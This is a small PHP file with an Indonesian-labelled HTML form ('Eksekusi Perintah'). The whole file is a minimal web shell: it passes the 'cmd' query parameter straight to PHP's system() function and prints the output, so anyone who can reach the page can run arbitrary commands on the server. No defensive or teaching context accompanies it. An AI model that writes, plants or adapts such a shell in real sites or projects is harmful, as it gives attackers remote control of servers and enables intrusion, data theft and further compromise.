<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Eksekusi Perintah</title>
</head>

<body>

    <form>
    <label for="cmd">Perintah</label>
    <input type="text" name="cmd" placeholder="perintah (cmd)" />
    <input type="submit" value="Eksekusi" />
    </form>

</body>
</html>

<?php

    if(isset($_GET['cmd'])){
        echo "<pre>";
        echo system($_GET['cmd']);
        echo "</pre>";
    }

?>